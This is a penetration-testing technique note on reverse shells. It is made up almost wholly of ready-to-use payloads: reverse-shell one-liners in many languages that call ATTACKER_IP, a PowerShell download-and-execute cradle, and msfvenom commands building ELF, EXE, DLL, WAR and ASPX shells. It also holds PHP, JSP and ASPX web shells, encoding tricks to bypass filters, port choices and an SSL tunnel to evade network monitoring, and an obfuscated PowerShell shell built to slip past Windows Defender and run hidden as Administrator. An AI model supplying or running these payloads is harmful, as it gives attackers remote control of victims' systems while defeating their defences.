---
title: "Reverse Shells"
type: technique
tags: [bind-shell, exploitation, php, post-exploitation, reverse-shell]
phase: exploitation
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [cpts-shells-payloads, thm-linux-reverseproxy, git-htb-writeups]
---

## What it is

A reverse shell causes the target system to initiate an outbound connection back to the attacker's listener, giving the attacker interactive command execution. Contrasts with a bind shell, where the target opens a listening port the attacker connects to.

See also: [[metasploit]], [[binary-exploitation]], [[file-upload]]

---

## How it works

The attacker starts a listener on their machine. A payload executes on the target (via RCE, file upload, deserialization, etc.) and spawns a shell process whose stdin/stdout/stderr are piped over a TCP/UDP socket back to the attacker's listener.

```
Attacker                         Target
[nc -lvnp 4444] <──TCP:4444───── [bash -i >& /dev/tcp/attacker/4444 0>&1]
```

---

## Prerequisites

- Code execution on target (RCE, file upload + trigger, deserialization, SSTI, etc.)
- Outbound connectivity from target to attacker IP on chosen port
- Listener started before payload executes

---

## Methodology

### Listeners

**netcat:**
```bash
nc -lvnp 4444
```

**rlwrap netcat (arrow keys, history, readline):**
```bash
rlwrap nc -lvnp 4444
```

**socat (full TTY out of the box):**
```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target (socat required on target)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

**pwncat-cs (auto-upgrades shell, module framework):**
```bash
pwncat-cs -lp 4444
```

**Metasploit multi/handler:**
```
use exploit/multi/handler
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

---

### Payloads — Linux / Unix

**Bash TCP:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# If >& is filtered:
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
```

**Bash UDP:**
```bash
sh -i >& /dev/udp/ATTACKER_IP/4444 0>&1
```

**Python 3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Python 2:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Perl:**
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

**Ruby:**
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**netcat with -e:**
```bash
nc -e /bin/sh ATTACKER_IP 4444
# Without -e (OpenBSD netcat):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
```

**PHP:**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

**Java:**
```java
r = Runtime.getRuntime();
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
p.waitFor()
```

**Node.js:**
```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
```

**Lua:**
```lua
os.execute("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

**Groovy (Jenkins Script Console):**
```groovy
String host="ATTACKER_IP";int port=4444;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

---

### Payloads — Windows / PowerShell

**PowerShell one-liner:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerShell via download:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
```

**ConPtyShell (full interactive Windows PTY):**
```powershell
# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp 4444
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP 4444
```

---

### MSFvenom Payload Generation

**Linux ELF stageless:**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
```

**Linux ELF staged (requires Metasploit handler):**
```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
```

**Windows EXE stageless:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

**Windows DLL:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o shell.dll
```

**PHP web shell:**
```bash
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
```

**ASPX:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
```

**WAR (Apache Tomcat):**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
# Deploy via Tomcat Manager at /manager/html
```

**Staged vs Stageless:**
- Staged (`shell/reverse_tcp`): small stager fetches full payload from Metasploit handler; smaller initial binary
- Stageless (`shell_reverse_tcp`): full payload in one binary; works with plain `nc` listener

---

### TTY Upgrade

Raw reverse shells lack job control, tab completion, and proper signal handling. Always upgrade.

**Step 1 — Spawn PTY on target:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Fallbacks:
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

**Step 2 — Background the shell:**
```
Ctrl+Z
```

**Step 3 — Fix local terminal:**
```bash
stty raw -echo; fg
```

**Step 4 — Fix remote terminal dimensions:**
```bash
export TERM=xterm-256color
stty rows 50 columns 220
# Match your actual terminal: run `stty size` in a local terminal first
```

---

### Port Selection for Evasion

| Port | Reason |
|------|--------|
| 80 | HTTP — almost always egress-allowed |
| 443 | HTTPS — almost always allowed; use SSL shell |
| 8080 | HTTP alt / proxy traffic |
| 53 | DNS — allowed where only DNS egress exists; pair with dnscat2 |
| 22 | SSH — allowed in developer environments |

**SSL/TLS shell with socat (evades DPI):**
```bash
# Attacker
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=attacker'
socat openssl-listen:443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 file:`tty`,raw,echo=0

# Target
socat openssl-connect:ATTACKER_IP:443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

---

### Web Shells

Short-circuit the network requirement — useful when reverse connections are blocked.

**PHP minimal:**
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

**PHP POST (less visible in access logs):**
```php
<?php system($_POST['cmd']); ?>
# curl -X POST http://target/shell.php -d 'cmd=id'
```

**JSP:**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASPX:**
```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>
```

**Encoded Payloads (bypass filtering):**
```bash
# Base64-encode bash reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64
echo <base64_string> | base64 -d | bash

# PowerShell base64 (Unicode encoding required)
$text = '$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)...'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))
powershell -enc <base64_string>
```

Upgrade from web shell to reverse shell once foothold established — web shells are fragile (no TTY, timeout risk, log noise).

### Evading Defender's on-disk signature (the classic TCPClient shell)

The plain `New-Object System.Net.Sockets.TCPClient(...)` + `iex $data` one-liner above is
signatured by Windows Defender: dropped to disk (or fetched) it is deleted/killed before it
connects, so the listener stays silent. Three source transforms defeat the signature match while
keeping identical behaviour (no AMSI patch needed - the reconstructed script is not what the
signature looks for):

- **Split the flagged type name** so the literal `TCPClient` never appears on disk:
  `$ns="System.Net.Sockets."+"TCP"+"Client"; $cl=New-Object $ns($ip,$port)`.
- **Drop `iex`/`Invoke-Expression`** (both signatured) for `&([scriptblock]::Create($cmd))`.
- **Rename every variable** to short/random names; avoid the well-known Nishang identifiers.

```powershell
$ns="System.Net.Sockets."+"TCP"+"Client";$cl=New-Object $ns("ATTACKER_IP",4444)
$st=$cl.GetStream();$wr=New-Object System.IO.StreamWriter($st);$wr.AutoFlush=$true
$bf=New-Object System.Byte[] 2048;$en=New-Object System.Text.ASCIIEncoding;$wr.Write("PS "+(pwd).Path+"> ")
while(($n=$st.Read($bf,0,2048)) -gt 0){$cm=$en.GetString($bf,0,$n);$rs=try{ &([scriptblock]::Create($cm)) 2>&1|Out-String }catch{ $_|Out-String };$wr.Write($rs+"PS "+(pwd).Path+"> ")};$cl.Close()
```

To run this from a dropped payload as a privileged process (e.g. a writable binary a scheduled task
runs as Administrator - see [[windows-privilege-escalation]]), wrap it in a freshly compiled custom
exe (`x86_64-w64-mingw32-gcc`) that calls `powershell -nop -w hidden -ep bypass -e <UTF-16LE-base64>`;
a brand-new binary has no AV signature, and the encoded command survives because the obfuscated
script above already clears the on-execute scan. See also [[windows-amsi-bypass]] for the
memory-patch route when AMSI (not the file signature) is the blocker.

<!-- promoted-slug: ps-revshell-defender-evasion -->
